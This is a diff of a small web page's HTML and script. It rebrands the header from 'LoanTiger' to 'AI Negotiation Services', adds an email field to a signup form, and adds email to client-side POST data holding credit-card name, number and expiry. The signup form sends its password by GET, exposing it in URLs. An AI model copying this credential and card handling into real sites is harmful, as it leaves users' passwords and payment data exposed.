@@ -22,11 +22,11 @@
 </script>
 <body>
 
-<header>
-  <div class="container">
-    <h1><img src="images/logo.png" alt="Company Logo" style="height:50px; vertical-align:middle;"> LoanTiger</h1>
-  </div>
-</header>
+  <header>
+    <div class="container">
+      <h1><img src="images/icon.png" alt="Company Logo" style="height:150px; vertical-align:middle;"> AI Negotiation Services</h1>
+    </div>
+  </header>
 
 <nav>
   <div class="container">
@@ -44,6 +44,10 @@
 <div class="container">
   <h2>Create Your Account</h2>
   <form id="signup-form" action="upload-offer.html" method="GET">
+    <div class="form-group">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" placeholder="Your email address" required>
+    </div>
     <div class="form-group">
       <label for="password">Password</label>
       <input type="password" id="password" name="password" placeholder="Create a password" required>
@@ -68,6 +72,7 @@
   document.getElementById('payment-form').addEventListener('submit', function(e) {
     e.preventDefault();
     var form = this;
+    var email = document.getElementById('payment-email').value;
     var ccName = document.getElementById('cc-name').value;
     var ccNumber = document.getElementById('cc-number').value;
     var ccExp = document.getElementById('cc-exp').value;
@@ -76,6 +81,7 @@
     var termsChecked = document.getElementById('terms-check').checked;
 
     var postData = new URLSearchParams();
+    postData.append('email', email);
     postData.append('cc_name', ccName);
     postData.append('cc_number', ccNumber);
     postData.append('cc_exp', ccExp);
